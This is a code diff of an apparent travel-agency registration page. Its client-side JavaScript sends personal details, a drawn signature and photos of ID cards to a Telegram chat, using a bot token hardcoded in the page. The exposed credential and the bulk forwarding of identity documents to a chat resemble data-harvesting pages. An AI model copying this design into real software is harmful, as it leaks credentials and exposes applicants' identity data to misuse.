@@ -53,93 +53,41 @@
 
   .btn-primary{background:var(--accent);color:#fff;border:none}
   .btn-clear{background:var(--danger);color:#fff;border:none}
-  .small-note{font-size:13px;color:#666;margin-top:6px}
 
-  /* ===== PROCESSING LOADER ===== */
-  #processing{
-    position:fixed;top:0;left:0;width:100%;height:100%;
-    background:rgba(0,0,0,.7);display:none;align-items:center;
-    justify-content:center;flex-direction:column;z-index:9999;
-  }
-
-  .loader{
-    width:80px;height:80px;
-    border:8px solid #ffffff55;
-    border-top:8px solid var(--accent);
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-  }
-
-  @keyframes spin{
-    0%{transform:rotate(0deg)}
-    100%{transform:rotate(360deg)}
-  }
-
-  .loader-text{
-    margin-top:18px;
-    color:#fff;font-size:20px;font-weight:700;
-    animation:pulse 1.2s infinite;
-    text-align:center;
-  }
-
-  @keyframes pulse{
-    0%{opacity:0.5}
-    100%{opacity:1}
-  }
-
-  /* ===== SUBMISSION POPUP ===== */
+  /* POPUP */
   #popupOverlay{
     position:fixed;top:0;left:0;width:100%;height:100%;
     background:rgba(0,0,0,.65);
     display:none;align-items:center;justify-content:center;
     z-index:999;
   }
-
   #popupBox{
     width:86%;max-width:360px;background:#fff;border-radius:14px;
     padding:20px;text-align:center;
     animation:popScale .4s ease;
   }
-
   @keyframes popScale{
     0%{transform:scale(0.5);opacity:0}
     100%{transform:scale(1);opacity:1}
   }
-
   .popup-title{
-    font-size:20px;font-weight:700;color:#0a8d34;
-    margin-bottom:10px;
+    font-size:20px;font-weight:700;color:#0a8d34;margin-bottom:10px;
   }
-
   .popup-code{
     font-size:24px;font-weight:800;color:#004aad;
-    margin:10px 0;
     animation:codeGlow 1.2s infinite alternate;
   }
-
   @keyframes codeGlow{
     from{opacity:0.5;transform:scale(1)}
     to{opacity:1;transform:scale(1.08)}
-  }
-
-  #closePopup{
-    margin-top:14px;background:#0a8d34;color:#fff;
-    padding:10px 20px;border-radius:8px;border:none;
-    font-size:16px;
   }
 </style>
 </head>
 <body>
 
-<!-- PROCESSING LOADER -->
-<div id="processing">
-  <div class="loader"></div>
-  <div class="loader-text">Processing your form...</div>
-</div>
-
 <div class="container">
-  <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
 
+  <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
   <h1>WILLY TRAVEL AGENCY</h1>
 
   <div class="row two">
@@ -155,7 +103,6 @@
     </div>
   </div>
 
-  <!-- Identity Section -->
   <div class="section">Identity of Registrant</div>
 
   <label>ሙሉ ስም / FULL NAME</label><input id="fullName">
@@ -164,8 +111,11 @@
   <label>እድሜ / AGE</label><input id="age" type="number">
   <label>ስልክ ቁጥር / PHONE</label><input id="phone">
   <label>አድራሻ / ADDRESS</label><input id="address">
+
   <label>ቁመት / Height (cm)</label><input id="height" type="number">
   <label>ክብደት / Weight (kg)</label><input id="weight" type="number">
+  
+  <label>Distinctive Mark</label><input id="distinct">
 
   <label>ወረዳ / District</label><input id="district">
   <label>ቀበሌ / Kebele</label><input id="kebele">
@@ -173,12 +123,10 @@
   <label>የትውልድ ቀን / Birth Date</label><input id="bod" type="date">
   <label>የትውልድ ቦታ / Birth Place</label><input id="bop">
 
-  <!-- Holder -->
-  <div class="section">የተያያዥ ሰው / HOLDER NAME</div>
+  <div class="section">Holder Information</div>
   <label>ስም / NAME</label><input id="holderName">
   <label>ስልክ / PHONE</label><input id="holderPhone">
 
-  <!-- Signature -->
   <div class="section">Signature</div>
   <canvas id="signaturePad"></canvas>
   <div class="controls">
@@ -187,11 +135,15 @@
   </div>
   <img id="signaturePreview" class="img-preview" style="display:none">
 
-  <!-- ID Upload -->
-  <div class="section">ID Upload/ የመታወቂያ ያስገቡ </div>
+  <div class="section">ID Upload</div>
 
-  <label>ID Front</label><input type="file" accept="image/*" id="idFrontInput"><img id="idFrontPreview" class="img-preview" style="display:none">
-  <label>ID Back</label><input type="file" accept="image/*" id="idBackInput"><img id="idBackPreview" class="img-preview" style="display:none">
+  <label>ID Front</label>
+  <input type="file" accept="image/*" id="idFrontInput">
+  <img id="idFrontPreview" class="img-preview" style="display:none">
+
+  <label>ID Back</label>
+  <input type="file" accept="image/*" id="idBackInput">
+  <img id="idBackPreview" class="img-preview" style="display:none">
 
   <button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
 </div>
@@ -199,52 +151,49 @@
 <!-- POPUP -->
 <div id="popupOverlay">
   <div id="popupBox">
-    <div class="popup-title">🎉 Your Form Was Submitted Successfully!</div>
-    <div>Please save your unique registration code.</div>
-    <div style="margin-top:10px;">Your Code:</div>
+    <div class="popup-title">Form Submitted Successfully!</div>
+    <div>Your Unique Code:</div>
     <div id="uniqueCode" class="popup-code"></div>
-    <button id="closePopup">OK</button>
   </div>
 </div>
 
 <script>
 const $ = id => document.getElementById(id);
 
-/* Preview function */
-function attachPreview(inputId,imgId){
-  $(inputId).addEventListener("change",()=>{
-    const f = $(inputId).files[0];
-    if(!f){ $(imgId).style.display="none"; return; }
-    $(imgId).src = URL.createObjectURL(f);
-    $(imgId).style.display="block";
+/* Image Preview */
+function preview(input, img){
+  $(input).addEventListener("change", () => {
+    const f = $(input).files[0];
+    if (!f){ $(img).style.display="none"; return; }
+    $(img).src = URL.createObjectURL(f);
+    $(img).style.display="block";
   });
 }
-attachPreview("photoInput","photoPreview");
-attachPreview("idFrontInput","idFrontPreview");
-attachPreview("idBackInput","idBackPreview");
+preview("photoInput","photoPreview");
+preview("idFrontInput","idFrontPreview");
+preview("idBackInput","idBackPreview");
 
-/* Signature pad */
-const canvas = $("signaturePad");
-const ctx = canvas.getContext("2d");
-let drawing = false;
+/* Signature Pad */
+const canvas=$("signaturePad");
+const ctx=canvas.getContext("2d");
+let drawing=false;
 
-function fitCanvas(){
-  const rect = canvas.getBoundingClientRect();
-  canvas.width = rect.width;
-  canvas.height = rect.height;
-  ctx.lineWidth = 2.5;
-  ctx.lineCap = "round";
-  ctx.strokeStyle = "#000";
+function resizeCanvas(){
+  const r=canvas.getBoundingClientRect();
+  canvas.width=r.width;
+  canvas.height=r.height;
+  ctx.lineWidth=2.5;
+  ctx.lineCap="round";
 }
-fitCanvas();
+resizeCanvas();
 
 canvas.addEventListener("pointerdown",e=>{
-  drawing = true;
+  drawing=true;
   ctx.beginPath();
   ctx.moveTo(e.offsetX,e.offsetY);
 });
 canvas.addEventListener("pointermove",e=>{
-  if(!drawing) return;
+  if(!drawing)return;
   ctx.lineTo(e.offsetX,e.offsetY);
   ctx.stroke();
 });
@@ -256,13 +205,13 @@ $("clearBtn").onclick=()=>{
 };
 
 $("previewBtn").onclick=()=>{
-  $("signaturePreview").src = canvas.toDataURL();
+  $("signaturePreview").src=canvas.toDataURL();
   $("signaturePreview").style.display="block";
 };
 
-/* Telegram Config */
-const BOT = "8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
-const CHAT = "8267646853";
+/* Telegram */
+const BOT="8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
+const CHAT="8267646853";
 
 async function sendText(text){
   return fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
@@ -272,81 +221,62 @@ async function sendText(text){
   });
 }
 
-async function sendPhoto(file, caption=""){
-  const fd = new FormData();
+async function sendPhoto(file,caption=""){
+  const fd=new FormData();
   fd.append("chat_id",CHAT);
   fd.append("photo",file);
   fd.append("caption",caption);
+
   return fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{
-    method:"POST",
-    body:fd
+    method:"POST", body:fd
   });
 }
 
 /* Submit */
-$("submitBtn").onclick = async ()=>{
+$("submitBtn").onclick=async()=>{
 
-  const name = $("fullName").value.trim();
-  if(!name){
-    alert("Enter full name");
-    return;
+  if(!$("fullName").value.trim()){
+    alert("Enter Full Name"); return;
   }
 
-  // Show processing loading animation
-  $("processing").style.display = "flex";
-
   const code="WTA-"+(Math.floor(Math.random()*900000)+100000);
-  $("uniqueCode").innerText = code;
+  $("uniqueCode").innerText=code;
+  $("popupOverlay").style.display="flex";
 
-  /* Attractive Message */
-  let msg =
-`💚✨ *WILLY TRAVEL AGENCY – NEW CLIENT FORM* ✨💚
+  let msg=
+`📌 WILLY TRAVEL AGENCY - NEW FORM
+--------------------------------------
+👤 Name: ${$("fullName").value}
+⚧ Sex: ${$("sex").value}
+🎂 Age: ${$("age").value}
+📞 Phone: ${$("phone").value}
+🏠 Address: ${$("address").value}
 
-🧾 *Registration Summary*
-———————————————
-👤 *Full Name:* ${$("fullName").value}
-⚧ *Sex:* ${$("sex").value}
-🎂 *Age:* ${$("age").value}
-📞 *Phone:* ${$("phone").value}
-🏠 *Address:* ${$("address").value}
+📏 Height: ${$("height").value} cm
+⚖️ Weight: ${$("weight").value} kg
+⭐ Distinctive Mark: ${$("distinct").value}
 
-📏 *Height:* ${$("height").value} cm
-⚖️ *Weight:* ${$("weight").value} kg
+🌍 District: ${$("district").value}
+🏘 Kebele: ${$("kebele").value}
 
-🏘 *District:* ${$("district").value}
-🏡 *Kebele:* ${$("kebele").value}
+🎉 BOD: ${$("bod").value}
+📍 BOP: ${$("bop").value}
 
-🎂 *Birth Date:* ${$("bod").value}
-📍 *Birth Place:* ${$("bop").value}
+👨‍👩‍👦 Holder: ${$("holderName").value}
+📞 Holder Phone: ${$("holderPhone").value}
 
-👥 *Emergency Contact:*  
-• *Name:* ${$("holderName").value}  
-• *Phone:* ${$("holderPhone").value}
-
-🔐 *Unique Code:* ${code}
-
-📩 *All images (Photo + ID + Signature) will arrive shortly…*
+🔐 UNIQUE CODE: ${code}
 `;
 
   await sendText(msg);
 
-  if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"📸 User Photo");
-  if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"🪪 ID Front");
-  if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"🪪 ID Back");
+  if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"User Photo");
+  if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ID Front");
+  if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ID Back");
 
   canvas.toBlob(async blob=>{
-    if(blob) await sendPhoto(blob,"✍️ Signature");
+    if(blob) await sendPhoto(blob,"Signature");
   });
-
-  // Hide processing + show success popup
-  setTimeout(()=>{
-    $("processing").style.display="none";
-    $("popupOverlay").style.display = "flex";
-  },2000);
-};
-
-$("closePopup").onclick = ()=>{
-  $("popupOverlay").style.display="none";
 };
 </script>
 
